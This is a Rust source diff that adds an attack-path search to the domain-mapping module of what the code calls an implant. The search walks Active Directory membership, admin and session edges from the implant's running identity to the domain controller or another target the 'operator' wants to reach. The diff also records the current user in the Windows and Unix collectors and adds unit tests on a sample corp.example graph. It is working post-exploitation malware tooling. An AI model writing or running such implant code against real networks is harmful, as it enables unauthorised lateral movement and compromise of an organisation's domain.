@@ -46,8 +46,178 @@ pub struct Domain {
     pub name: String,
     /// The domain controller that serves the machine.
     pub controller: String,
+    /// The identity the implant runs as: the start of every path.
+    pub me: String,
     /// The graph edges.
     pub edges: Vec<Edge>,
+}
+
+/// One step of a path through the graph.
+#[derive(Clone, Debug)]
+pub struct Step {
+    /// The kind of the edge that was walked.
+    pub kind: String,
+    /// Where the step starts.
+    pub source: String,
+    /// Where the step ends.
+    pub target: String,
+}
+
+/// One path from the current identity to a target.
+///
+/// A path is the answer to "how do I get there": it is not a list of the
+/// edges of the domain, it is the chain that leads from the identity the
+/// implant runs as to the thing the operator wants to reach.
+#[derive(Clone, Debug)]
+pub struct Path {
+    /// The steps, in the order they have to be walked.
+    pub steps: Vec<Step>,
+}
+
+impl Path {
+    /// The path as one line: the chain of the nodes with the edges between.
+    pub fn text(&self) -> String {
+        if self.steps.is_empty() {
+            return String::new();
+        }
+        let mut out = self.steps[0].source.clone();
+        for step in &self.steps {
+            out.push_str(&format!(" -[{}]-> {}", step.kind, step.target));
+        }
+        out
+    }
+
+    /// The identity of the path: two paths with the same steps are the same
+    /// path, however many times the search found them.
+    pub fn key(&self) -> String {
+        let mut out = String::new();
+        for step in &self.steps {
+            out.push_str(&format!("{}|{}|{};", step.kind, step.source, step.target));
+        }
+        out
+    }
+}
+
+/// The longest path the search walks.
+pub const MAX_PATH_DEPTH: usize = 8;
+
+/// The largest number of paths the search returns.
+pub const MAX_PATHS: usize = 20;
+
+/// The paths from the current identity to a target.
+///
+/// The target is the name of a node of the graph.  An empty target means the
+/// domain controller: the node every operator wants to reach, and the one
+/// the graph knows how to name in two ways (the controller of the logon
+/// session and the controller of the domain).
+///
+/// The search walks the edges in their own direction, so a path is a chain
+/// that the graph really allows.  The search is breadth first: the shortest
+/// paths come first, and the ones that take a detour come later.
+pub fn paths(domain: &Domain, target: &str) -> Vec<Path> {
+    let goals = goal_set(domain, target);
+    if goals.is_empty() {
+        return Vec::new();
+    }
+    let start = if domain.me.is_empty() {
+        // Without an identity the search starts at the nodes nothing points
+        // at: those are the leaves of the graph the operator can stand on.
+        let mut leaves: Vec<String> = Vec::new();
+        for edge in &domain.edges {
+            if !goals.contains(&edge.target) && !leaves.contains(&edge.source) {
+                leaves.push(edge.source.clone());
+            }
+        }
+        leaves
+    } else {
+        vec![domain.me.clone()]
+    };
+
+    let mut found: Vec<Path> = Vec::new();
+    let mut queue: Vec<(String, Vec<Step>)> = start
+        .into_iter()
+        .map(|node| (node, Vec::new()))
+        .collect();
+    let mut visited: Vec<String> = Vec::new();
+    while !queue.is_empty() && found.len() < MAX_PATHS {
+        let (node, steps) = queue.remove(0);
+        if visited.contains(&node) {
+            continue;
+        }
+        visited.push(node.clone());
+        if steps.len() >= MAX_PATH_DEPTH {
+            continue;
+        }
+        for edge in &domain.edges {
+            if edge.source != node {
+                continue;
+            }
+            let mut next = steps.clone();
+            next.push(Step {
+                kind: edge.kind.to_string(),
+                source: edge.source.clone(),
+                target: edge.target.clone(),
+            });
+            if goals.contains(&edge.target) {
+                let candidate = Path { steps: next };
+                if !found.iter().any(|p| p.key() == candidate.key()) {
+                    found.push(candidate);
+                }
+                continue;
+            }
+            if visited.contains(&edge.target) {
+                continue;
+            }
+            queue.push((edge.target.clone(), next));
+        }
+    }
+    found
+}
+
+/// The nodes that count as the goal.
+fn goal_set(domain: &Domain, target: &str) -> Vec<String> {
+    let mut goals: Vec<String> = Vec::new();
+    if !target.is_empty() {
+        goals.push(target.to_string());
+        return goals;
+    }
+    if !domain.controller.is_empty() {
+        goals.push(domain.controller.clone());
+    }
+    for edge in &domain.edges {
+        if edge.kind == "DomainController" && !goals.contains(&edge.target) {
+            goals.push(edge.target.clone());
+        }
+    }
+    goals
+}
+
+/// The report of the domain map: the paths and the edges they use.
+///
+/// The operator does not want the raw edges: what the module gives is the
+/// chain from the identity the implant runs as to the domain controller,
+/// with the edges of the chain in the order they have to be walked.
+pub fn map_report(domain: &Domain, target: &str) -> String {
+    let mut out = String::new();
+    if !domain.name.is_empty() {
+        out.push_str(&format!("domain    : {}\n", domain.name));
+    }
+    if !domain.me.is_empty() {
+        out.push_str(&format!("identity  : {}\n", domain.me));
+    }
+    if !domain.controller.is_empty() {
+        out.push_str(&format!("controller: {}\n", domain.controller));
+    }
+    let found = paths(domain, target);
+    if found.is_empty() {
+        out.push_str("paths     : none\n");
+        return out;
+    }
+    out.push_str(&format!("paths     : {}\n", found.len()));
+    for (index, path) in found.iter().enumerate() {
+        out.push_str(&format!("  path {}: {}\n", index + 1, path.text()));
+    }
+    out
 }
 
 /// The well known relative identifiers of a domain.
@@ -319,6 +489,7 @@ fn resolver_search() -> Option<String> {
 fn collect_windows(domain: &mut Domain) {
     domain.controller = domain_controller();
     let user = qualified_user(domain);
+    domain.me = user.clone();
     let host = host_name(domain);
 
     // Who am I, and which groups am I in?
@@ -416,6 +587,7 @@ fn collect_windows(domain: &mut Domain) {
 fn collect_unix(domain: &mut Domain) {
     let user = capture("id -un");
     let user = user.trim().to_string();
+    domain.me = user.clone();
     let host = capture("hostname -f");
     let host = host.trim().to_string();
 
@@ -829,5 +1001,78 @@ DC: \\\\dc02.corp.example
         assert!(is_separator("-----------------------------------------"));
         assert!(!is_separator("AccountName"));
         assert!(!is_separator(""));
+    }
+
+    /// A small graph: alice is a member of a group, the group may
+    /// administer a host and the host has a session of the controller.
+    fn sample_domain() -> Domain {
+        Domain {
+            name: "corp.example".to_string(),
+            controller: "dc01.corp.example".to_string(),
+            me: "CORP\\alice@corp.example".to_string(),
+            edges: vec![
+                Edge::new(
+                    "MemberOf",
+                    "CORP\\alice@corp.example",
+                    "CORP\\Domain Admins@corp.example",
+                ),
+                Edge::new(
+                    "MemberOf",
+                    "CORP\\alice@corp.example",
+                    "CORP\\Service Accounts@corp.example",
+                ),
+                Edge::new(
+                    "AdminTo",
+                    "CORP\\Domain Admins@corp.example",
+                    "dc01.corp.example",
+                ),
+                Edge::new(
+                    "AdminTo",
+                    "CORP\\Service Accounts@corp.example",
+                    "web01.corp.example",
+                ),
+                Edge::new(
+                    "HasSession",
+                    "CORP\\bob@corp.example",
+                    "dc01.corp.example",
+                ),
+                Edge::new("DomainController", "corp.example", "dc01.corp.example"),
+            ],
+        }
+    }
+
+    #[test]
+    fn the_path_to_the_controller_is_found() {
+        let domain = sample_domain();
+        let found = paths(&domain, "");
+        assert!(!found.is_empty(), "no path was found");
+        // The shortest path is the one through the domain edge.
+        let text = found[0].text();
+        assert!(text.starts_with("CORP\\alice@corp.example"), "{text}");
+        assert!(text.contains("dc01.corp.example"), "{text}");
+    }
+
+    #[test]
+    fn the_path_to_a_named_target_is_found() {
+        let domain = sample_domain();
+        let found = paths(&domain, "web01.corp.example");
+        assert_eq!(found.len(), 1);
+        assert_eq!(found[0].steps.len(), 2);
+        assert_eq!(found[0].steps[0].kind, "MemberOf");
+        assert_eq!(found[0].steps[1].kind, "AdminTo");
+    }
+
+    #[test]
+    fn a_target_that_is_not_in_the_graph_has_no_path() {
+        let domain = sample_domain();
+        assert!(paths(&domain, "nowhere.example").is_empty());
+    }
+
+    #[test]
+    fn the_map_report_reads_like_a_map() {
+        let domain = sample_domain();
+        let text = map_report(&domain, "");
+        assert!(text.contains("identity  : CORP\\alice@corp.example"), "{text}");
+        assert!(text.contains("paths     :"), "{text}");
     }
 }
